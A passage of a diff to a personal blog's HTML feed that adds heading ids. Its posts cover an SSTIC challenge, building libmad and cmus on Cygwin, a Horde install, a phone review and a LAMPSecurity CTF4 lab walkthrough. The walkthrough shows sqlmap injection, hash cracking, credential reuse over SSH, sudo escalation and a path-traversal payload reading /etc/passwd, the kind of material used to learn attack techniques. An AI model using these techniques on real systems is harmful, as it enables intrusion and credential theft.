 flag to reserve a ticket. An April prank challenge was post yesterday.
 &lt;/p&gt;
 &lt;p&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;/p&gt;
-&lt;h1&gt;April Pranks&lt;/h1&gt;
+&lt;h1 id="april-pranks"&gt;April Pranks&lt;/h1&gt;
 &lt;p&gt;The first of April is always the occasion for some great pranks:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="http://twitter.com/CERN/status/583147747710263296"&gt;CERN confirm the existence of the Force&lt;/a&gt;:&lt;/li&gt;
@@ -6004,7 +6056,7 @@ flag to reserve a ticket. An April prank challenge was post yesterday.
 &lt;li&gt;&lt;a href="http://gentoo.org"&gt;gentoo.org adopted a beautiful design&lt;/a&gt;:&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;&lt;img alt="gentoo.org old school" src="/media/2015.04/gentoo.org.PNG"&gt;&lt;/p&gt;
-&lt;h1&gt;SSTIC Challenge&lt;/h1&gt;
+&lt;h1 id="sstic-challenge"&gt;SSTIC Challenge&lt;/h1&gt;
 &lt;p&gt;But one of them was released by the &lt;a href="https://www.sstic.org"&gt;SSTIC&lt;/a&gt; an French
 security event which give every year a difficult challenge that grant
 automatically a place to the event (tickets are sold out in approximately one
@@ -6015,7 +6067,7 @@ in case):&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Strings&lt;/h2&gt;
+&lt;h2 id="strings"&gt;Strings&lt;/h2&gt;
 &lt;p&gt;Let's try something like &lt;code&gt;strings&lt;/code&gt; to see what appends:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;maggick&lt;/span&gt;&lt;span class="nv"&gt;@debian&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~/&lt;/span&gt;&lt;span class="k"&gt;work&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sstic&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;strings&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chlg&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;wc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="mi"&gt;10797&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
@@ -6035,7 +6087,7 @@ in case):&lt;/p&gt;
 
 
 &lt;p&gt;No chance coming from here.&lt;/p&gt;
-&lt;h2&gt;Hexview&lt;/h2&gt;
+&lt;h2 id="hexview"&gt;Hexview&lt;/h2&gt;
 &lt;p&gt;We use radare2 to see the hexcode:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x00000000&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1008&lt;/span&gt; &lt;span class="n"&gt;chlg&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2015&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="k"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;   &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;  &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;  &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;  &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="n"&gt;B&lt;/span&gt;  &lt;span class="k"&gt;C&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;  &lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="n"&gt;F&lt;/span&gt;  &lt;span class="mi"&gt;0123456789&lt;/span&gt;&lt;span class="n"&gt;ABCDEF&lt;/span&gt;&lt;/span&gt;
@@ -6164,7 +6216,7 @@ about the key nor the salt. Shall we take a look at the code itself:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Pixel&lt;/h2&gt;
+&lt;h2 id="pixel"&gt;Pixel&lt;/h2&gt;
 &lt;p&gt;There seems to be some repetition in this code, let's open it with the &lt;code&gt;dff&lt;/code&gt; to
 see if this is an
 &lt;a href="http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_Codebook_.28ECB.29"&gt;ECB image&lt;/a&gt;.
@@ -6176,7 +6228,7 @@ us to persevere in this way:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="SSTIC pixel view, resolution 563" src="/media/2015.04/sstic_res_563.PNG"&gt;&lt;/p&gt;
 &lt;p&gt;At the resolution of 750 we got something pretty:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="SSTIC pixel view, resolution 750" src="/media/2015.04/sstic_res_750.PNG"&gt;&lt;/p&gt;
-&lt;h2&gt;Got you !&lt;/h2&gt;
+&lt;h2 id="got-you"&gt;Got you !&lt;/h2&gt;
 &lt;p&gt;We just need to open it, turn it upside down and mirroring it to get the final
 result:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="SSTIC final view, reversed" src="/media/2015.04/sstic_final.PNG"&gt;&lt;/p&gt;
@@ -6220,7 +6272,7 @@ package any mp3 codec so your &lt;code&gt;flac&lt;/code&gt; files will be read b
 install the flac codec).&lt;/p&gt;
 &lt;p&gt;In oder to read mp3 files with &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; we need to
 install (so to build) a library that read this file format: libmad&lt;/p&gt;
-&lt;h1&gt;libmad&lt;/h1&gt;
+&lt;h1 id="libmad"&gt;libmad&lt;/h1&gt;
 &lt;p&gt;First of all we need to download the source package from the official web site :
 &lt;a href="http://www.underbit.com/products/mad/"&gt;http://www.underbit.com/products/mad/&lt;/a&gt;
 now we extract the files and make the classical commands:&lt;/p&gt;
@@ -6231,7 +6283,7 @@ now we extract the files and make the classical commands:&lt;/p&gt;
 
 
 &lt;p&gt;You may encounter the "guess build" error:&lt;/p&gt;
-&lt;h2&gt;guess error&lt;/h2&gt;
+&lt;h2 id="guess-error"&gt;guess error&lt;/h2&gt;
 &lt;p&gt;This append during the make command&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;cannot&lt;/span&gt; &lt;span class="n"&gt;guess&lt;/span&gt; &lt;span class="n"&gt;build&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;you&lt;/span&gt; &lt;span class="n"&gt;must&lt;/span&gt; &lt;span class="n"&gt;specify&lt;/span&gt; &lt;span class="n"&gt;one&lt;/span&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -6241,7 +6293,7 @@ now we extract the files and make the classical commands:&lt;/p&gt;
 old files config.guess and config.sub from libmad with the new ones downloadable
 at : &lt;a href="ftp://ftp.gnu.org/pub/gnu/config/README"&gt;ftp://ftp.gnu.org/pub/gnu/config/README&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;An other classical error is the &lt;code&gt;-fforce-memi&lt;/code&gt; one:&lt;/strong&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;code&gt;-fforce-mem&lt;/code&gt; gcc error&lt;/h2&gt;
+&lt;h2 id="-fforce-mem-gcc-error"&gt;&lt;code&gt;-fforce-mem&lt;/code&gt; gcc error&lt;/h2&gt;
 &lt;p&gt;This error is characterize by the following trace:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;gcc&lt;/span&gt;: &lt;span class="nv"&gt;error&lt;/span&gt;: &lt;span class="nv"&gt;unrecognized&lt;/span&gt; &lt;span class="nv"&gt;command&lt;/span&gt; &lt;span class="nv"&gt;line&lt;/span&gt; &lt;span class="nv"&gt;option&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;-fforce-mem&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="nv"&gt;Makefile&lt;/span&gt;:&lt;span class="mi"&gt;383&lt;/span&gt;: &lt;span class="nv"&gt;recipe&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;target&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;version.lo&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;/span&gt;
@@ -6274,7 +6326,7 @@ but it is just a &lt;code&gt;sed&lt;/code&gt; command&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;At this point you should not have any error, but a classical one is the
 missing library error:&lt;/strong&gt;&lt;/p&gt;
-&lt;h2&gt;missing library error&lt;/h2&gt;
+&lt;h2 id="missing-library-error"&gt;missing library error&lt;/h2&gt;
 &lt;p&gt;The error is indicating the precise missing library (here &lt;code&gt;libtool&lt;/code&gt;):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;Makefile&lt;/span&gt;.&lt;span class="nv"&gt;am&lt;/span&gt;:&lt;span class="mi"&gt;27&lt;/span&gt;: &lt;span class="nv"&gt;Libtool&lt;/span&gt; &lt;span class="nv"&gt;library&lt;/span&gt; &lt;span class="nv"&gt;used&lt;/span&gt; &lt;span class="nv"&gt;but&lt;/span&gt; `&lt;span class="nv"&gt;LIBTOOL&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt; is undefined&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="nv"&gt;Makefile&lt;/span&gt;.&lt;span class="nv"&gt;am&lt;/span&gt;:&lt;span class="mi"&gt;27&lt;/span&gt;:&lt;/span&gt;
@@ -6287,7 +6339,7 @@ missing library error:&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;And we just need to install the missing library using &lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt; package manager.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Now we have libmad install in &lt;code&gt;/usr/local/lib/&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;h1&gt;cmus&lt;/h1&gt;
+&lt;h1 id="cmus"&gt;cmus&lt;/h1&gt;
 &lt;p&gt;But our installation is not completed we need to recompile
 &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; with the support
 of this new library and if you just launch the 3 basic commands it will not
@@ -6302,7 +6354,7 @@ to add a flag at the configure step:&lt;/p&gt;
 &lt;p&gt;And now you can launch &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; and re-add your mp3
 files and &lt;strong&gt;it works!&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;You can still have some erros, mostly with the newest cygwin versions.&lt;/p&gt;
-&lt;h2&gt;recipe for target 'ape.o' failed&lt;/h2&gt;
+&lt;h2 id="recipe-for-target-apeo-failed"&gt;recipe for target 'ape.o' failed&lt;/h2&gt;
 &lt;p&gt;&lt;em&gt;This error was first mention by buzzbo on
 &lt;a href="https://github.com/cmus/cmus/issues/343"&gt;github&lt;/a&gt; and resolved by mahkoh.
 Thanks to them.&lt;/em&gt;&lt;/p&gt;
@@ -6328,7 +6380,7 @@ this after all the includes of the offending files (&lt;code&gt;xmalloc.h&lt;/co
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Workflow - TL;DR&lt;/h3&gt;
+&lt;h3 id="workflow-tldr"&gt;Workflow - TL;DR&lt;/h3&gt;
 &lt;p&gt;Here is the &lt;a href="https://en.wikipedia.org/wiki/TL;DR"&gt;TL;DR&lt;/a&gt;.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Cygwin dependencies&lt;/li&gt;
@@ -6371,16 +6423,16 @@ no more working on my server. Therefore I decided to switch to Horde, a all in
 one webmail which manage e-mails, calendars, contacts, notes and todo lists.&lt;/p&gt;
 &lt;p&gt;Horde is written in PHP and is accessible using Pear (PHP Extension and
 Application Repository).&lt;/p&gt;
-&lt;h1&gt;Installing Horde&lt;/h1&gt;
+&lt;h1 id="installing-horde"&gt;Installing Horde&lt;/h1&gt;
 &lt;p&gt;Let us see how to install Horde.&lt;/p&gt;
-&lt;h2&gt;Necessary packages&lt;/h2&gt;
+&lt;h2 id="necessary-packages"&gt;Necessary packages&lt;/h2&gt;
 &lt;p&gt;First of all some dependencies should be meet. Considering you are on Debian
 and using &lt;code&gt;apt-get&lt;/code&gt; you may run the following command:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;apt-get install php5-sasl php5-intl libssh2-php php5-curl php-http php5-xmlrpc php5-geoip php5-ldap php5-memcache php5-memcached php5-tidy&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Pear install&lt;/h2&gt;
+&lt;h2 id="pear-install"&gt;Pear install&lt;/h2&gt;
 &lt;p&gt;We want to use Pear to get the last version of Horde. So we add the channel, the
 Horde role, and we install Horde.
 You will be prompt with the question &lt;code&gt;Filesystem installation for base Horde
@@ -6394,7 +6446,7 @@ make this folder accessible.&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Database creation&lt;/h2&gt;
+&lt;h2 id="database-creation"&gt;Database creation&lt;/h2&gt;
 &lt;p&gt;Horde use a database to store your calendars, contact, task lists and
 notes. Nevertheless the script does not create this database. Therefore we must
 do it manually for instance with the following commands and a MySQL database:&lt;/p&gt;
@@ -6423,7 +6475,7 @@ do it manually for instance with the following commands and a MySQL database:&lt
 &lt;p&gt;Specify an existing mail user who you want to give administrator permissions (optional): &lt;em&gt;user@domain.com&lt;/em&gt; This user will have access to the administration interface within horde.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;This is all an you should get access to the horde interface.&lt;/p&gt;
-&lt;h1&gt;Activating the exchange server&lt;/h1&gt;
+&lt;h1 id="activating-the-exchange-server"&gt;Activating the exchange server&lt;/h1&gt;
 &lt;p&gt;The administrator user will have a lot of options one of them is the activation
 of the exchange server.&lt;/p&gt;
 &lt;p&gt;That is all for this article about Horde, the install process can be found on
@@ -6500,12 +6552,12 @@ S. Mis à part le bouton « power » qui est …&lt;/p&gt;</summary><content t
 &lt;p&gt;J'ai testé le téléphone ZTE OPEN C avec Firefox OS 0.3 pendant une semaine.
 Première surprise au déballage, le téléphone ressemble beaucoup au Samsung Galaxy
 S. Mis à part le bouton « power » qui est sur le dessus et non sur le côté.&lt;/p&gt;
-&lt;h2&gt;Prise en main&lt;/h2&gt;
+&lt;h2 id="prise-en-main"&gt;Prise en main&lt;/h2&gt;
 &lt;p&gt;Au démarrage le téléphone est fluide, le fond d'écran rappel que l'on est sur un
 OS différent. Niveau application c'est assez pauvre, on a Firefox, une
 application radio, une application vidéo bref les classiques. Par contre pas de
 calculatrice (heureusement on en trouve facilement une sur le « marketplace »)&lt;/p&gt;
-&lt;h2&gt;Utilisation&lt;/h2&gt;
+&lt;h2 id="utilisation"&gt;Utilisation&lt;/h2&gt;
 &lt;p&gt;Pour l'utilisation au quotidien il faut revoir ces habitudes et trouver des
 applications équivalentes et ce n'est pas toujours le cas. Suite à la fermeture
 du service « Google reader » j'ai décidé de migré mes services centralisés chez
@@ -6542,7 +6594,7 @@ menus comme c'est le cas par exemple sous cyanogen.&lt;/p&gt;
 &lt;li&gt;il m'a fallut plusieurs essais pour réussir à passer un appel, des fois je
   n'entendais rien ou mon correspondant ne m'entendais pas&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;Le ZTE Open C est un téléphone destiné à la base pour les pays en développement
 (d'où son prix ~80 euros) et
 ça ce ressent mais il reste un téléphone simple et léger qui peux constituer un
@@ -6550,17 +6602,17 @@ bon point d'entré dans le monde des smartphones pour ceux qui n'y sont pas enco
 (enfants, parents, grands-parents, etc.).&lt;/p&gt;</content><category term="firefox os"></category><category term="open source"></category><category term="mobile phone"></category></entry><entry><title>LAMPSecurity: CTF4</title><link href="https://maggick.fr/2014/08/lampsecurity-ctf4.html" rel="alternate"></link><published>2014-08-29T00:00:00+02:00</published><updated>2014-08-29T00:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2014-08-29:/2014/08/lampsecurity-ctf4.html</id><summary type="html">&lt;p&gt;I start the LAMPSecurity CTF4 challenge of vulnhub
 &lt;a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/"&gt;available here&lt;/a&gt;.
 The goal is to get a root shell on the server.&lt;/p&gt;
-&lt;h1&gt;Discovery&lt;/h1&gt;
+&lt;h1 id="discovery"&gt;Discovery&lt;/h1&gt;
 &lt;p&gt;First of all we need to determine the IP address of the server.
 Since we launch it in a bridged virtual machine the local router got the IP …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I start the LAMPSecurity CTF4 challenge of vulnhub
 &lt;a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/"&gt;available here&lt;/a&gt;.
 The goal is to get a root shell on the server.&lt;/p&gt;
-&lt;h1&gt;Discovery&lt;/h1&gt;
+&lt;h1 id="discovery"&gt;Discovery&lt;/h1&gt;
 &lt;p&gt;First of all we need to determine the IP address of the server.
 Since we launch it in a bridged virtual machine the local router got the IP
 address in the DHCP logs. We simply found the most recent one. For me it is
 &lt;code&gt;192.168.1.56&lt;/code&gt;.&lt;/p&gt;
-&lt;h2&gt;Nmap&lt;/h2&gt;
+&lt;h2 id="nmap"&gt;Nmap&lt;/h2&gt;
 &lt;p&gt;Let start with a simple nmap&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;#&lt;span class="nv"&gt;nmap&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;A&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;oA&lt;/span&gt; &lt;span class="nv"&gt;ctf4&lt;/span&gt; &lt;span class="mi"&gt;192&lt;/span&gt;.&lt;span class="mi"&gt;168&lt;/span&gt;.&lt;span class="mi"&gt;1&lt;/span&gt;.&lt;span class="mi"&gt;56&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;&lt;span class="nv"&gt;Nmap&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;.&lt;span class="mi"&gt;47&lt;/span&gt; &lt;span class="nv"&gt;scan&lt;/span&gt; &lt;span class="nv"&gt;initiated&lt;/span&gt; &lt;span class="nv"&gt;Thu&lt;/span&gt; &lt;span class="nv"&gt;Aug&lt;/span&gt; &lt;span class="mi"&gt;28&lt;/span&gt; &lt;span class="mi"&gt;18&lt;/span&gt;:&lt;span class="mi"&gt;49&lt;/span&gt;:&lt;span class="mi"&gt;49&lt;/span&gt; &lt;span class="mi"&gt;2014&lt;/span&gt; &lt;span class="nv"&gt;as&lt;/span&gt;: &lt;span class="nv"&gt;nmap&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;A&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;oA&lt;/span&gt; &lt;span class="nv"&gt;ctf4&lt;/span&gt; &lt;span class="mi"&gt;192&lt;/span&gt;.&lt;span class="mi"&gt;168&lt;/span&gt;.&lt;span class="mi"&gt;1&lt;/span&gt;.&lt;span class="mi"&gt;56&lt;/span&gt;&lt;/span&gt;
@@ -6594,13 +6646,13 @@ address in the DHCP logs. We simply found the most recent one. For me it is
 &lt;li&gt;a web service on port 80, note that there is five disallowed entries in robots.txt&lt;/li&gt;
 &lt;li&gt;and a close CUPS service on port 631.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2&gt;The website&lt;/h2&gt;
+&lt;h2 id="the-website"&gt;The website&lt;/h2&gt;
 &lt;p&gt;Let's take a look at the web site. It is a simple blog site with a XSS flaw on
 the search engine.&lt;/p&gt;
 &lt;p&gt;The article are indexed with a GET parameter id. This parameter is vulnerable to
 an SQL injection.&lt;/p&gt;
-&lt;h1&gt;Exploitation&lt;/h1&gt;
-&lt;h2&gt;Sqlmap&lt;/h2&gt;
+&lt;h1 id="exploitation"&gt;Exploitation&lt;/h1&gt;
+&lt;h2 id="sqlmap"&gt;Sqlmap&lt;/h2&gt;
 &lt;p&gt;We launch sqlmap:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;#&lt;span class="nv"&gt;sqlmap&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;u&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;http://192.168.1.56/index.html?page=blog&amp;amp;title=Blog&amp;amp;id=6&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;p&lt;/span&gt; &lt;span class="nv"&gt;id&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nv"&gt;tables&lt;/span&gt;&lt;/span&gt;
 &lt;span class="code-line"&gt;  &lt;span class="nv"&gt;sqlmap&lt;/span&gt; &lt;span class="nv"&gt;identified&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;following&lt;/span&gt; &lt;span class="nv"&gt;injection&lt;/span&gt; &lt;span class="nv"&gt;points&lt;/span&gt; &lt;span class="nv"&gt;with&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;total&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="nv"&gt;HTTP&lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;s&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;requests&lt;/span&gt;:&lt;/span&gt;
@@ -6714,7 +6766,7 @@ an SQL injection.&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;Cracking the hashes&lt;/h2&gt;
+&lt;h2 id="cracking-the-hashes"&gt;Cracking the hashes&lt;/h2&gt;
 &lt;p&gt;We save the hahses in a file (option proposed by sqlmap) and we launch john the
 ripper on it:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;#&lt;/span&gt;&lt;span class="n"&gt;john&lt;/span&gt; &lt;span class="n"&gt;hashes&lt;/span&gt; &lt;span class="c1"&gt;--format=raw-md5&lt;/span&gt;&lt;/span&gt;
@@ -6737,7 +6789,7 @@ undone9999. We cracked an other password:&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2&gt;SSH connexions&lt;/h2&gt;
+&lt;h2 id="ssh-connexions"&gt;SSH connexions&lt;/h2&gt;
 &lt;p&gt;Okay the same password seems to be used everywhere and I was a bit lost to how
 to continue so I try the credentials on the ssh service: &lt;em&gt;it works!&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;First of all I logged with the jdurbin account.
@@ -6745,13 +6797,13 @@ There seems to be anything useful but in my search I saw that achen had an
 ssh private key readable by everyone (a ppk one for PuTTY).
 Okay lets use it to connect on the machine. It ask no password and we got a
 shell, what now?&lt;/p&gt;
-&lt;h2&gt;Privileges escalation&lt;/h2&gt;
+&lt;h2 id="privileges-escalation"&gt;Privileges escalation&lt;/h2&gt;
 &lt;p&gt;I try to see what was the differences with this account and I saw a pdf file
 "linux_administration.pdf" so I tried to use the sudo command with &lt;code&gt;sudo -v&lt;/code&gt; and
 once again: &lt;em&gt;it works!&lt;/em&gt;
 So a simple &lt;code&gt;sudo su&lt;/code&gt; give us the root rights.&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;DONE!&lt;/em&gt;&lt;/p&gt;
-&lt;h1&gt;Summary&lt;/h1&gt;
+&lt;h1 id="summary"&gt;Summary&lt;/h1&gt;
 &lt;p&gt;Lets resume :&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;exploitation of the SQL injection&lt;/li&gt;
@@ -6762,7 +6814,7 @@ So a simple &lt;code&gt;sudo su&lt;/code&gt; give us the root rights.&lt;/p&gt;
 &lt;li&gt;sudo su&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;That was a easy one !&lt;/p&gt;
-&lt;h1&gt;Nota bene&lt;/h1&gt;
+&lt;h1 id="nota-bene"&gt;Nota bene&lt;/h1&gt;
 &lt;p&gt;Oh yeah we do not explore the lead of the file injection in the
 page GET parameter:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mi"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;index&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;Blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;/span&gt;
